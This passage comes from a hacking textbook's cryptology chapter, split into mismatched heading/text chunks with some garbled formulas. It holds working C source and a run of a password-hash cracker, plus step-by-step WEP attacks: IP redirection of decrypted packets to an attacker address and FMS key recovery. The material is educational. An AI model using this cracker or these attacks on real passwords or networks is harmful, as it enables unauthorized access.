-o ppm_gen ppm_gen.c -lcrypt\nreader@hacking:~/booksrc $ ./ppm_gen\nAdding ** to 4char.ppm..\nAdding !** to 4char.ppm..\nAdding \"** to 4char.ppm..\n.:[ output trimmed ]:.\nAdding ~|** to 4char.ppm..\nAdding ~}** to 4char.ppm..\nAdding ~~** to 4char.ppm..\nfinished.. saving..\n@hacking:~ $ ls -lh 4char.ppm\n-rw-r--r-- 1 142M 2007-09-30 13:56 4char.ppm\nreader@hacking:~/booksrc $\nThe 142MB 4char.ppm file contains loose associations between the\nplaintext and hash data for every possible four-character password. This data\ncan then be used by this next program to quickly crack four-character pass-\nwords that would foil a dictionary attack.\nppm_crack.c\n/*********************************************************\\\n* Password Probability Matrix * File: ppm_crack.c *\n***********************************************************\n* *\n* Author: Jon Erickson <matrix@phiral.com> *\n* Organization: Phiral Research Laboratories *\n* *\n428 0x700\n* This is the crack program for the PPM proof of concept.*\n* It uses an existing file called 4char.ppm, which *\n* contains information regarding all possible 4– *\n* character passwords salted with 'je'. This file can *\n* be generated with the corresponding ppm_gen.c program. *\n* *\n\\*********************************************************/\n#define _XOPEN_SOURCE\n#include <unistd.h>\n#include <stdio.h>\n#include <stdlib.h>\n#define HEIGHT 16384\n#define WIDTH 1129\n#define DEPTH 8\n#define SIZE HEIGHT * WIDTH * DEPTH\n#define DCM HEIGHT * WIDTH\n/* Map a single hash byte to an enumerated value. */\nint enum_hashbyte(char a) {\nint i, j;\ni = (int)a;\nif((i >= 46) && (i <= 57))\nj = i - 46;\nelse if ((i >= 65) && (i <= 90))\nj = i - 53;\nelse if ((i >= 97) && (i <= 122))\nj = i - 59;\nreturn j;\n}\n/* Map 3 hash bytes to an enumerated value. */\nint enum_hashtriplet(char a, char b, char c) {\nreturn (((enum_hashbyte(c)%4)*4096)+(enum_hashbyte(a)*64)+enum_hashbyte(b));\n}\n/* Merge two vectors. */\nvoid merge(char *vector1, char *vector2) {\nint i;\nfor(i=0; i < WIDTH; i++)\nvector1[i] &= vector2[i];\n}\n/* Returns the bit in the vector at the passed index position */\nint get_vector_bit(char *vector, int index) {\nreturn ((vector[(index/8)]&(1<<(index%8)))>>(index%8));\n}\n/* Counts the number of plaintext pairs in the passed vector */\nint count_vector_bits(char *vector) {\nint i, count=0;\nfor(i=0; i < 9025; i++)\ncount += get_vector_bit(vector, i);\nreturn count;\nCryptology 429\n}\n/* Print the plaintext pairs that each ON bit in the vector enumerates. */\nvoid print_vector(char *vector) {\nint i, a, b, val;\nfor(i=0; i < 9025; i++) {\nif(get_vector_bit(vector, i) == 1) { // If bit is on,\na = i / 95; // calculate the\nb = i - (a * 95); // plaintext pair\nprintf(\"%c%c \",a+32, b+32); // and print it.\n}\n}\nprintf(\"\\n\");\n}\n/* Barf a message and exit. */\nvoid barf(char *message, char *extra) {\nprintf(message, extra);\nexit(1);\n}\n/* Crack a 4-character password using generated 4char.ppm file. */\nint main(int argc, char *argv[]) {\nchar *pass, plain[5];\nunsigned char bin_vector1[WIDTH], bin_vector2[WIDTH], temp_vector[WIDTH];\nchar prob_vector1[2][9025];\nchar prob_vector2[2][9025];\nint a, b, i, j, len, pv1_len=0, pv2_len=0;\nFILE *fd;\nif(argc < 1)\nbarf(\"Usage: %s <password hash> (will use the file 4char.ppm)\\n\", argv[0]);\nif(!(fd = fopen(\"4char.ppm\", \"r\")))\nbarf(\"Fatal: Couldn't open PPM file for reading.\\n\", NULL);\npass = argv[1]; // First argument is password hash\nprintf(\"Filtering possible plaintext bytes for the first two characters:\\n\");\nfseek(fd,(DCM*0)+enum_hashtriplet(pass[2], pass[3], pass[4])*WIDTH, SEEK_SET);\nfread(bin_vector1, WIDTH, 1, fd); // Read the vector associating bytes 2-4 of hash.\nlen = count_vector_bits(bin_vector1);\nprintf(\"only 1 vector of 4:\\t%d plaintext pairs, with %0.2f%% saturation\\n\", len, len*100.0/\n9025.0);\nfseek(fd,(DCM*1)+enum_hashtriplet(pass[4], pass[5], pass[6])*WIDTH, SEEK_SET);\nfread(temp_vector, WIDTH, 1, fd); // Read the vector associating bytes 4-6 of hash.\nmerge(bin_vector1, temp_vector); // Merge it with the first vector.\nlen = count_vector_bits(bin_vector1);\nprintf(\"vectors 1 AND 2 merged:\\t%d plaintext pairs, with %0.2f%% saturation\\n\", len,\nlen*100.0/9025.0);\n430 0x700\nfseek(fd,(DCM*2)+enum_hashtriplet(pass[6], pass[7], pass[8])*WIDTH, SEEK_SET);\nfread(temp_vector, WIDTH, 1, fd); // Read the vector associating bytes 6-8 of hash.\nmerge(bin_vector1, temp_vector); // Merge it with the first two vectors.\nlen = count_vector_bits(bin_vector1);\nprintf(\"first 3 vectors merged:\\t%d plaintext pairs, with %0.2f%% saturation\\n\", len,\nlen*100.0/9025.0);\nfseek(fd,(DCM*3)+enum_hashtriplet(pass[8], pass[9],pass[10])*WIDTH, SEEK_SET);\nfread(temp_vector, WIDTH, 1, fd); // Read the vector associatind bytes 8-10 of hash.\nmerge(bin_vector1, temp_vector); // Merge it with the othes vectors.\nlen = count_vector_bits(bin_vector1);\nprintf(\"all 4 vectors merged:\\t%d plaintext pairs, with %0.2f%% saturation\\n\", len,\nlen*100.0/9025.0);\nprintf(\"Possible plaintext pairs for the first two bytes:\\n\");\nprint_vector(bin_vector1);\nprintf(\"\\nFiltering possible plaintext bytes for the last two characters:\\n\");\nfseek(fd,(DCM*4)+enum_hashtriplet(pass[2], pass[3], pass[4])*WIDTH, SEEK_SET);\nfread(bin_vector2, WIDTH, 1, fd); // Read the vector associating bytes 2-4 of hash.\nlen = count_vector_bits(bin_vector2);\nprintf(\"only 1 vector of 4:\\t%d plaintext pairs, with %0.2f%% saturation\\n\", len, len*100.0/\n9025.0);\nfseek(fd,(DCM*5)+enum_hashtriplet(pass[4], pass[5], pass[6])*WIDTH, SEEK_SET);\nfread(temp_vector, WIDTH, 1, fd); // Read the vector associating bytes 4-6 of hash.\nmerge(bin_vector2, temp_vector); // Merge it with the first vector.\nlen = count_vector_bits(bin_vector2);\nprintf(\"vectors 1 AND 2 merged:\\t%d plaintext pairs, with %0.2f%% saturation\\n\", len,\nlen*100.0/9025.0);\nfseek(fd,(DCM*6)+enum_hashtriplet(pass[6], pass[7], pass[8])*WIDTH, SEEK_SET);\nfread(temp_vector, WIDTH, 1, fd); // Read the vector associating bytes 6-8 of hash.\nmerge(bin_vector2, temp_vector); // Merge it with the first two vectors.\nlen = count_vector_bits(bin_vector2);\nprintf(\"first 3 vectors merged:\\t%d plaintext pairs, with %0.2f%% saturation\\n\", len,\nlen*100.0/9025.0);\nfseek(fd,(DCM*7)+enum_hashtriplet(pass[8], pass[9],pass[10])*WIDTH, SEEK_SET);\nfread(temp_vector, WIDTH, 1, fd); // Read the vector associatind bytes 8-10 of hash.\nmerge(bin_vector2, temp_vector); // Merge it with the othes vectors.\nlen = count_vector_bits(bin_vector2);\nprintf(\"all 4 vectors merged:\\t%d plaintext pairs, with %0.2f%% saturation\\n\", len,\nlen*100.0/9025.0);\nprintf(\"Possible plaintext pairs for the last two bytes:\\n\");\nprint_vector(bin_vector2);\nCryptology 431\nprintf(\"Building probability vectors...\\n\");\nfor(i=0; i < 9025; i++) { // Find possible first two plaintext bytes.\nif(get_vector_bit(bin_vector1, i)==1) {;\nprob_vector1[0][pv1_len] = i / 95;\nprob_vector1[1][pv1_len] = i - (prob_vector1[0][pv1_len] * 95);\npv1_len++;\n}\n}\nfor(i=0; i < 9025; i++) { // Find possible last two plaintext bytes.\nif(get_vector_bit(bin_vector2, i)) {\nprob_vector2[0][pv2_len] = i / 95;\nprob_vector2[1][pv2_len] = i - (prob_vector2[0][pv2_len] * 95);\npv2_len++;\n}\n}\nprintf(\"Cracking remaining %d possibilites..\\n\", pv1_len*pv2_len);\nfor(i=0; i < pv1_len; i++) {\nfor(j=0; j < pv2_len; j++) {\nplain[0] = prob_vector1[0][i] + 32;\nplain[1] = prob_vector1[1][i] + 32;\nplain[2] = prob_vector2[0][j] + 32;\nplain[3] = prob_vector2[1][j] + 32;\nplain[4] = 0;\nif(strcmp(crypt(plain, \"je\"), pass) == 0) {\nprintf(\"Password : %s\\n\", plain);\ni = 31337;\nj = 31337;\n}\n}\n}\nif(i < 31337)\nprintf(\"Password wasn't salted with 'je' or is not 4 chars long.\\n\");\nfclose(fd);\n}\nThe second piece of code, ppm_crack.c, can be used to crack the\ntroublesome password of h4R% in a matter of seconds:\nreader@hacking:~/booksrc $ ./crypt_test h4R% je\npassword \"h4R%\" with salt \"je\" hashes to ==> jeMqqfIfPNNTE\nreader@hacking:~/booksrc $ gcc -O3 -o ppm_crack ppm_crack.c -lcrypt\nreader@hacking:~/booksrc $ ./ppm_crack jeMqqfIfPNNTE\nFiltering possible plaintext bytes for the first two characters:\nonly 1 vector of 4: 3801 plaintext pairs, with 42.12% saturation\nvectors 1 AND 2 merged: 1666 plaintext pairs, with 18.46% saturation\nfirst 3 vectors merged: 695 plaintext pairs, with 7.70% saturation\nall 4 vectors merged: 287 plaintext pairs, with 3.18% saturation\nPossible plaintext pairs for the first two bytes:\n4 9 N !& !M !Q \"/ \"5 \"W #K #d #g #p $K $O $s %) %Z %\\ %r &( &T '- '0 '7 'D\n'F ( (v (| )+ ). )E )W *c *p *q *t *x +C -5 -A -[ -a .% .D .S .f /t 02 07 0?\n0e 0{ 0| 1A 1U 1V 1Z 1d 2V 2e 2q 3P 3a 3k 3m 4E 4M 4P 4X 4f 6 6, 6C 7: 7@ 7S\n7z 8F 8H 9R 9U 9_ 9~ :- :q :s ;G ;J ;Z ;k <! <8 =! =3 =H =L =N =Y >V >X ?1 @#\n432 0x700"
  },
  {
    "input": "0x770 Wireless 802.11b Encryption",
    "output": "@W @v @| AO B/ B0 BO Bz C( D8 D> E8 EZ F@ G& G? Gj Gy H4 I@ J JN JT JU Jh Jq\nKs Ku M) M{ N, N: NC NF NQ Ny O/ O[ P9 Pc Q! QA Qi Qv RA Sg Sv T0 Te U& U> UO\nVT V[ V] Vc Vg Vi W: WG X\" X6 XZ X` Xp YT YV Y^ Yl Yy Y{ Za [$ [* [9 [m [z \\\" \\\n+ \\C \\O \\w ]( ]: ]@ ]w _K _j `q a. aN a^ ae au b: bG bP cE cP dU d] e! fI fv g!\ngG h+ h4 hc iI iT iV iZ in k. kp l5 l` lm lq m, m= mE n0 nD nQ n~ o# o: o^ p0\np1 pC pc q* q0 qQ q{ rA rY s\" sD sz tK tw u- v$ v. v3 v; v_ vi vo wP wt x\" x&\nx+ x1 xQ xX xi yN yo zO zP zU z[ z^ zf zi zr zt {- {B {a |s }) }+ }? }y ~L ~m\nFiltering possible plaintext bytes for the last two characters:\nonly 1 vector of 4: 3821 plaintext pairs, with 42.34% saturation\nvectors 1 AND 2 merged: 1677 plaintext pairs, with 18.58% saturation\nfirst 3 vectors merged: 713 plaintext pairs, with 7.90% saturation\nall 4 vectors merged: 297 plaintext pairs, with 3.29% saturation\nPossible plaintext pairs for the last two bytes:\n! & != !H !I !K !P !X !o !~ \"r \"{ \"} #% #0 $5 $] %K %M %T &\" &% &( &0 &4 &I\n&q &} 'B 'Q 'd )j )w *I *] *e *j *k *o *w *| +B +W ,' ,J ,V -z . .$ .T /' /_\n0Y 0i 0s 1! 1= 1l 1v 2- 2/ 2g 2k 3n 4K 4Y 4\\ 4y 5- 5M 5O 5} 6+ 62 6E 6j 7* 74\n8E 9Q 9\\ 9a 9b :8 :; :A :H :S :w ;\" ;& ;L <L <m <r <u =, =4 =v >v >x ?& ?` ?j\n?w @0 A* B B@ BT C8 CF CJ CN C} D+ D? DK Dc EM EQ FZ GO GR H) Hj I: I> J( J+\nJ3 J6 Jm K# K) K@ L, L1 LT N* NW N` O= O[ Ot P: P\\ Ps Q- Qa R% RJ RS S3 Sa T!\nT$ T@ TR T_ Th U\" U1 V* V{ W3 Wy Wz X% X* Y* Y? Yw Z7 Za Zh Zi Zm [F \\( \\3 \\5 \\\n_ \\a \\b \\| ]$ ]. ]2 ]? ]d ^[ ^~ `1 `F `f `y a8 a= aI aK az b, b- bS bz c( cg dB\ne, eF eJ eK eu fT fW fo g( g> gW g\\ h$ h9 h: h@ hk i? jN ji jn k= kj l7 lo m<\nm= mT me m| m} n% n? n~ o oF oG oM p\" p9 p\\ q} r6 r= rB sA sN s{ s~ tX tp u\nu2 uQ uU uk v# vG vV vW vl w* w> wD wv x2 xA y: y= y? yM yU yX zK zv {# {) {=\n{O {m |I |Z }. }; }d ~+ ~C ~a\nBuilding probability vectors...\nCracking remaining 85239 possibilites..\nPassword : h4R%\nreader@hacking:~/booksrc $\nThese programs are proof-of-concept hacks, which take advantage of the\nbit diffusion provided by hash functions. There are other time-space trade-off\nattacks, and some have become quite popular. RainbowCrack is a popular\ntool, which has support for multiple algorithms. If you want to learn more,\nconsult the Internet.\n0x770 Wireless 802.11b Encryption\nWireless 802.11b security has been a big issue, primarily due to the absence\nof it. Weaknesses in Wired Equivalent Privacy (WEP), the encryption method\nused for wireless, contribute greatly to the overall insecurity. There are other\ndetails, sometimes ignored during wireless deployments, which can also lead\nto major vulnerabilities.\nThe fact that wireless networks exist on layer 2 is one of these details.\nIfthe wireless network isn’t VLANed off or firewalled, an attacker associated\nto the wireless access point could redirect all the wired network traffic out\nover the wireless via ARP redirection. This, coupled with the tendency to\nhook wireless access points to internal private networks, can lead to some\nserious vulnerabilities.\nCryptology 433"
  },
  {
    "input": "0x771 Wired Equivalent Privacy",
    "output": "Of course, if WEP is turned on, only clients with the proper WEP key\nwill be allowed to associate to the access point. If WEP is secure, there\nshouldn’t be any concern about rogue attackers associating and causing\nhavoc. This begs the question, “How secure is WEP?”\n0x771 Wired Equivalent Privacy\nWEP was meant to be an encryption method providing security equivalent\ntoa wired access point. It was originally designed with 40-bit keys; later,\nWEP2 came along to increase the key size to 104 bits. All of the encryption is\ndone on a per-packet basis, so each packet is essentially a separate plaintext\nmessage to send. The packet will be called M.\nFirst, a checksum of message M is computed, so the message integrity\ncan be checked later. This is done using a 32-bit cyclic redundancy check-\nsum function aptly named CRC32. This checksum will be called CS, so\nCS=CRC32(M). This value is appended to the end of the message, which\nmakes up the plaintext message P:\nPlaintext message P\nMessage M CRC(M) CS\nNow, the plaintext message needs to be encrypted. This is done using\nRC4, which is a stream cipher. This cipher, initialized with a seed value,\ncangenerate a keystream, which is just an arbitrarily long stream of pseudo-\nrandom bytes. WEP uses an initialization vector (IV) for the seed value.\nThe IV consists of 24 bits generated for each packet. Some older WEP\nimplementations simply use sequential values for the IV, while others use\nsome form of pseudo-randomizer.\nRegardless of how the 24 bits of IV are chosen, they are prepended to\nthe WEP key. (These 24 bits of IV are included in the WEP key size in a bit\nof clever marketing spin; when a vendor talks about 64-bit or 128-bit WEP\nkeys, the actual keys are only 40 bits and 104 bits, respectively, combined\nwith 24 bits of IV.) The IV and the WEP key together make up the seed\nvalue, which will be called S.\nSeed value S\n24-bit IV 40-bit or 104-bit WEP key\nThen the seed value S is fed into RC4, which will generate a keystream.\nThis keystream is XORed with the plaintext message P to produce the\nciphertext C. The IV is prepended to the ciphertext, and the whole thing is\nencapsulated with yet another header and sent out over the radio link.\n434 0x700"
  },
  {
    "input": "0x772 RC4 Stream Cipher",
    "output": "Plaintext message P (M with 32-bit CS)\nXOR\nKeystream generated by RC4(seed)\nequals\n24-bit IV Ciphertext C\nWhen the recipient receives a WEP-encrypted packet, the process is simply\nreversed. The recipient pulls the IV from the message and then concatenates\nthe IV with his own WEP key to produce a seed value of S. If the sender and\nreceiver both have the same WEP key, the seed values will be the same. This\nseed is fed into RC4 again to produce the same keystream, which is XORed\nwith the rest of the encrypted message. This will produce the original plaintext\nmessage, consisting of the packet message M concatenated with the integrity\nchecksum CS. The recipient then uses the same CRC32 function to recalculate\nthe checksum for M and checks that the calculated value matches the received\nvalue of CS. If the checksums match, the packet is passed on. Otherwise, there\nwere too many transmission errors or the WEP keys didn’t match, and the\npacket is dropped.\nThat’s basically WEP in a nutshell.\n0x772 RC4 Stream Cipher\nRC4 is a surprisingly simple algorithm. It consists of two algorithms: the Key\nScheduling Algorithm (KSA) and the Pseudo-Random Generation Algorithm\n(PRGA). Both of these algorithms use an 8-by-8 S-box, which is just an array of\n256 numbers that are both unique and range in value from 0 to 255. Stated\nsimply, all the numbers from 0 to 255 exist in the array, but they’re all just\nmixed up in different ways. The KSA does the initial scrambling of the S-box,\nbased on the seed value fed into it, and the seed can be up to 256 bits long.\nFirst, the S-box array is filled with sequential values from 0 to 255. This\narray will be aptly named S. Then, another 256-byte array is filled with the seed\nvalue, repeating as necessary until the entire array is filled. This array will be\nnamed K. Then the S array is scrambled using the following pseudo-code.\nj = 0;\nfor i = 0 to 255\n{\nj = (j + S[i] + K[i]) mod 256;\nswap S[i] and S[j];\n}\nOnce that is done, the S-box is all mixed up based on the seed value.\nThat’s the key scheduling algorithm. Pretty simple.\nCryptology 435"
  },
  {
    "input": "0x781 Offline Brute-Force Attacks",
    "output": "Now when keystream data is needed, the Pseudo-Random Generation\nAlgorithm (PRGA) is used. This algorithm has two counters, i and j, which\nare both initialized at 0 to begin with. After that, for each byte of keystream\ndata, the following pseudo-code is used.\ni = (i + 1) mod 256;\nj = (j + S[i]) mod 256;\nswap S[i] and S[j];\nt = (S[i] + S[j]) mod 256;\nOutput the value of S[t];\nThe outputted byte of S[t] is the first byte of the keystream. This algorithm\nis repeated for additional keystream bytes.\nRC4 is simple enough that it can be easily memorized and implemented\non the fly, and it is quite secure if used properly. However, there are a few\nproblems with the way RC4 is used for WEP.\n0x780 WEP Attacks\nThere are several problems with the security of WEP. In all fairness, it was\nnever meant to be a strong cryptographic protocol, but rather a way to provide\na wired equivalency, as alluded to by the acronym. Aside from the security\nweaknesses relating to association and identities, there are several problems\nwith the cryptographic protocol itself. Some of these problems stem from\ntheuse of CRC32 as a checksum function for message integrity, and other\nproblems stem from the way IVs are used.\n0x781 Offline Brute-Force Attacks\nBrute forcing will always be a possible attack on any computationally secure\ncryptosystem. The only question that remains is whether it’s a practical attack\nor not. With WEP, the actual method of offline brute forcing is simple:\nCapture a few packets, then try to decrypt the packets using every possible\nkey. Next, recalculate the checksum for the packet, and compare this with\nthe original checksum. If they match, then that’s most likely the key. Usually,\nthis needs to be done with at least two packets, since it’s likely that a single\npacket can be decrypted with an invalid key yet the checksum will still be\nvalid.\nHowever, under the assumption of 10,000 cracks per second, brute forcing\nthrough the 40-bit keyspace would take over three years. Realistically, modern\nprocessors can achieve more than 10,000 cracks per second, but even at\n200,000 cracks per second, this would take a few months. Depending on\nthe resources and dedication of an attacker, this type of attack may or may\nnot be feasible.\nTim Newsham has provided an effective cracking method that attacks\nweaknesses in the password-based key-generation algorithm that is used\nbymost 40-bit (marketed as 64-bit) cards and access points. His method\neffectively reduces the 40-bit keyspace down to 21 bits, which can be cracked\n436 0x700"
  },
  {
    "input": "0x782 Keystream Reuse",
    "output": "in a matter of minutes under the assumption of 10,000 cracks per second\n(and in a matter of seconds on a modern processor). More information on\nhis methods can be found at http://www.lava.net/~newsham/wlan.\nFor 104-bit (marketed as 128-bit) WEP networks, brute-forcing just isn’t\nfeasible.\n0x782 Keystream Reuse\nAnother potential problem with WEP lies in keystream reuse. If two\nplaintexts (P) are XORed with the same keystream to produce two separate\nciphertexts (C), XORing those ciphertexts together will cancel out the\nkeystream, resulting in the two plaintexts XORed with each other.\nC = P ⊕ RC4(seed)\n1 1\nC = P ⊕ RC4(seed)\n2 2\nC ⊕ C = [P ⊕ RC4(seed)] ⊕ [P ⊕ RC4(seed)] = P ⊕ P\n1 2 1 2 1 2\nFrom here, if one of the plaintexts is known, the other one can easily be\nrecovered. In addition, since the plaintexts in this case are Internet packets\nwith a known and fairly predictable structure, various techniques can be\nemployed to recover both original plaintexts.\nThe IV is intended to prevent these types of attacks; without it, every\npacket would be encrypted with the same keystream. If a different IV is used\nfor each packet, the keystreams for packets will also be different. However, if\nthe same IV is reused, both packets will be encrypted with the same keystream.\nThis is a condition that is easy to detect, since the IVs are included in plaintext\nin the encrypted packets. Moreover, the IVs used for WEP are only 24 bits in\nlength, which nearly guarantees that IVs will be reused. Assuming that IVs\nare chosen at random, statistically there should be a case of keystream reuse\nafter just 5,000 packets.\nThis number seems surprisingly small due to a counterintuitive prob-\nabilistic phenomenon known as the birthday paradox. This paradox states that\nif 23 people are in the same room, two of these people should share a birthday.\nWith 23 people, there are (23 · 22) / 2, or 253, possible pairs. Each pair has a\nprobability of success of 1/365, or about 0.27 percent, which corresponds to\na probability of failure of 1 − (1 / 365), or about 99.726 percent. By raising\nthis probability to the power of 253, the overall probability of failure is shown\nto be about 49.95 percent, meaning that the probability of success is just a\nlittle over 50 percent.\nThis works the same way with IV collisions. With 5,000 packets, there are\n(5000 · 4999) / 2, or 12,497,500, possible pairs. Each pair has a probability of\nfailure of 1 − (1 / 224). When this is raised to the power of the number of\npossible pairs, the overall probability of failure is about 47.5 percent, meaning\nthat there’s a 52.5 percent chance of an IV collision with 5,000 packets:\n⎛ ⎞5 --,-- 0 -- 0 - 0 ---⋅-- 4 -,-- 9 -- 9 -- 9\n1– ⎝ 1–--1--- ⎠ 2 = 52.5Ψ\n224\nCryptology 437"
  },
  {
    "input": "0x784 IP Redirection",
    "output": "After an IV collision is discovered, some educated guesses about the\nstructure of the plaintexts can be used to reveal the original plaintexts by\nXORing the two ciphertexts together. Also, if one of the plaintexts is known,\nthe other plaintext can be recovered with a simple XORing. One method\nofobtaining known plaintexts might be through spam email, where the\nattacker sends the spam and the victim checks mail over the encrypted\nwireless connection.\n0x783 IV-Based Decryption Dictionary Tables\nAfter plaintexts are recovered for an intercepted message, the keystream for\nthat IV will also be known. This means that this keystream can be used to\ndecrypt any other packet with the same IV, providing it’s not longer than the\nrecovered keystream. Over time, it’s possible to create a table of keystreams\nindexed by every possible IV. Since there are only 224 possible IVs, if 1,500\nbytes of keystream are saved for each IV, the table would only require about\n24GB of storage. Once a table like this is created, all subsequent encrypted\npackets can be easily decrypted.\nRealistically, this method of attack would be very time consuming and\ntedious. It’s an interesting idea, but there are much easier ways to defeat WEP.\n0x784 IP Redirection\nAnother way to decrypt encrypted packets is to trick the access point into\ndoing all the work. Usually, wireless access points have some form of Internet\nconnectivity, and if this is the case, an IP redirection attack is possible. First, an\nencrypted packet is captured, and the destination address is changed to an\nIP address the attacker controls, without decrypting the packet. Then, the\nmodified packet is sent back to the wireless access point, which will decrypt\nthe packet and send it right to the attacker’s IP address.\nThe packet modification is made possible due to the CRC32 checksum\nbeing a linear, unkeyed function. This means that the packet can be strate-\ngically modified and the checksum will still come out the same.\nThis attack also assumes that the source and destination IP addresses\nare known. This information is easy enough to figure out, just based on\nthestandard internal network IP addressing schemes. Also, a few cases of\nkeystream reuse due to IV collisions can be used to determine the addresses.\nOnce the destination IP address is known, this value can be XORed with\nthe desired IP address, and this whole thing can be XORed into place in the\nencrypted packet. The XORing of the destination IP address will cancel out,\nleaving behind the desired IP address XORed with the keystream. Then, to\nensure that the checksum stays the same, the source IP address must be\nstrategically modified.\nFor example, assume the source address is 192.168.2.57 and the\ndestination address is 192.168.2.1. The attacker controls the address\n123.45.67.89 and wants to redirect traffic there. These IP addresses\n438 0x700"
  },
  {
    "input": "0x785 Fluhrer, Mantin, and Shamir Attack",
    "output": "existinthe packet in the binary form of high- and low-order 16-bit words.\nThe conversion is fairly simple:\nSrc IP = 192.168.2.57\nSH = 192 · 256 + 168 = 50344\nSL = 2 · 256 + 57 = 569\nDst IP = 192.168.2.1\nDH = 192 · 256 + 168 = 50344\nDL = 2 · 256 + 1 = 513\nNew IP = 123.45.67.89\nNH = 123 · 256 + 45 = 31533\nNL = 67 · 256 + 89 = 17241\nThe checksum will be changed by N + N − D − D , so this value must\nH L H L\nbe subtracted from somewhere else in the packet. Since the source address is\nalso known and doesn’t matter too much, the low-order 16-bit word of that\nIP address makes a good target:\nS'L = SL − (NH + NL − DH − DL)\nS'L = 569 − (31533 + 17241 − 50344 − 513)\nS'L = 2652\nThe new source IP address should therefore be 192.168.10.92. The\nsource IP address can be modified in the encrypted packet using the same\nXORing trick, and then the checksums should match. When the packet is\nsent to the wireless access point, the packet will be decrypted and sent to\n123.45.67.89, where the attacker can retrieve it.\nIf the attacker happens to have the ability to monitor packets on an\nentire class B network, the source address doesn’t even need to be modified.\nAssuming the attacker had control over the entire 123.45.X.X IP range, the\nlow-order 16-bit word of the IP address could be strategically chosen not to\ndisturb the checksum. If NL = DH + DL − NH, the checksum won’t be changed.\nHere’s an example:\nNL = DH + DL − NH\nNL = 50,344 + 513 − 31,533\nN'L = 82390\nThe new destination IP address should be 123.45.75.124.\n0x785 Fluhrer, Mantin, and Shamir Attack\nThe Fluhrer, Mantin, and Shamir (FMS) attack is the most commonly\nusedattack against WEP, popularized by tools such as AirSnort. This attack\nCryptology 439\nis really quite amazing. It takes advantage of weaknesses in the key-\nscheduling algorithm of RC4 and the use of IVs.\nThere are weak IV values that leak information about the secret key in\nthe first byte of the keystream. Since the same key is used over and over with\ndifferent IVs, if enough packets with weak IVs are collected, and the first byte\nof the keystream is known, the key can be determined. Luckily, the first byte\nof an 802.11b packet is the snap header, which is almost always 0xAA. This\nmeans the first byte of the keystream can be easily obtained by XORing the\nfirst encrypted byte with 0xAA.\nNext, weak IVs need to be located. IVs for WEP are 24 bits, which trans-\nlates to three bytes. Weak IVs are in the form of (A + 3, N − 1, X), where A is\nthe byte of the key to be attacked, N is 256 (since RC4 works in modulo 256),\nand X can be any value. So, if the zeroth byte of the keystream is being\nattacked, there would be 256 weak IVs in the form of (3, 255, X), where X\nranges from 0 to 255. The bytes of the keystream must be attacked in order,\nso the first byte cannot be attacked until the zeroth byte is known.\nThe algorithm itself is pretty simple. First, it performs A + 3 steps of the\nKey Scheduling Algorithm (KSA). This can be done without knowing the\nkey, since the IV will occupy the first three bytes of the K array. If the zeroth\nbyte of the key is known and A equals 1, the KSA can be worked to the fourth\nstep, since the first four bytes of the K array will be known.\nAt this point, if S[0] or S[1] have been disturbed by the last step, the\nentire attempt should be discarded. More simply stated, if j is less than 2, the\nattempt should be discarded. Otherwise, take the value of j and the value of\nS[A + 3], and subtract both of these from the first keystream byte (modulo\n256, of course). This value will be the correct key byte about 5 percent of the\ntime and effectively random less than 95 percent of the time. If this is done\nwith enough weak IVs (with varying values for X), the correct key byte can be\ndetermined. It takes about 60 IVs to bring the probability above 50 percent.\nAfter one key byte is determined, the whole process can be done again to\ndetermine the next key byte, until the entire key is revealed.\nFor the sake of demonstration, RC4 will be scaled back so N equals 16\ninstead of 256. This means that everything is modulo 16 instead of 256, and\nall the arrays are 16 “bytes” consisting of 4 bits, instead of 256 actual bytes.\nAssuming the key is (1, 2, 3, 4, 5), and the zeroth key byte will be attacked,\nA equals 0. This means the weak IVs should be in the form of (3, 15, X). In\nthis example, X will equal 2, so the seed value will be (3, 15, 2, 1, 2, 3, 4, 5).\nUsing this seed, the first byte of keystream output will be 9.\noutput = 9\nA = 0\nIV = 3, 15, 2\nKey = 1, 2, 3, 4, 5\nSeed = IV concatenated with the key\nK[] = 3 15 2 X X X X X3 15 2 X X X X X\nS[] = 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15\n440 0x700\nSince the key is currently unknown, the K array is loaded up with what\ncurrently is known, and the S array is filled with sequential values from 0 to\n15. Then, j is initialized to 0, and the first three steps of the KSA are done.\nRemember that all math is done modulo 16.\nKSA step one:\ni = 0\nj = j + S[i] + K[i]\nj = 0 + 0 + 3 = 3\nSwap S[i] and S[j]\nK[] = 3 15 2 X X X X X3 15 2 X X X X X\nS[] = 3 1 2 0 4 5 6 7 8 9 10 11 12 13 14 15\nKSA step two:\ni = 1\nj = j + S[i] + K[i]\nj = 3 + 1 + 15 = 3\nSwap S[i] and S[j]\nK[] = 3 15 2 X X X X X3 15 2 X X X X X\nS[] = 3 0 2 1 4 5 6 7 8 9 10 11 12 13 14 15\nKSA step three:\ni = 2\nj = j + S[i] + K[i]\nj = 3 + 2 + 2 = 7\nSwap S[i] and S[j]\nK[] = 3 15 2 X X X X X3 15 2 X X X X X\nS[] = 3 07 1 4 5 62 8 9 10 11 12 13 14 15\nAt this point, j isn’t less than 2, so the process can continue. S[3] is 1, j is\n7, and the first byte of keystream output was 9. So the zeroth byte of the key\nshould be 9 − 7 − 1 = 1.\nThis information can be used to determine the next byte of the key,\nusing IVs in the form of (4, 15, X) and working the KSA through to the\nfourth step. Using the IV (4, 15, 9), the first byte of keystream is 6.\noutput = 6\nA = 0\nIV = 4, 15, 9\nKey = 1, 2, 3, 4, 5\nCryptology 441\nSeed = IV concatenated with the key\nK[] = 4 15 9 1 X X X X4 15 9 1 X X X X\nS[] = 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15\nKSA step one:\ni = 0\nj = j + S[i] + K[i]\nj = 0 + 0 + 4 = 4\nSwap S[i] and S[j]\nK[] = 4 15 9 1 X X X X4 15 9 1 X X X X\nS[] = 4 1 2 3 0 5 6 7 8 9 10 11 12 13 14 15\nKSA step two:\ni = 1\nj = j + S[i] + K[i]\nj = 4 + 1 + 15 = 4\nSwap S[i] and S[j]\nK[] = 4 15 9 1X X X X4 15 9 1 X X X X\nS[] = 4 0 2 3 1 5 6 7 8 9 10 11 12 13 14 15\nKSA step three:\ni = 2\nj = j + S[i] + K[i]\nj = 4 + 2 + 9 = 15\nSwap S[i] and S[j]\nK[] = 4 15 9 1 X X X X4 15 9 1 X X X X\nS[] = 4 015 3 1 5 6 7 8 9 10 11 12 13 14 2\nKSA step four:\ni = 3\nj = j + S[i] + K[i]\nj = 15 + 3 + 1 = 3\nSwap S[i] and S[j]\nK[] = 4 15 9 1 X X X X4 15 9 1 X X X X\nS[] = 4 015 3 1 5 6 7 8 9 10 11 12 13 14 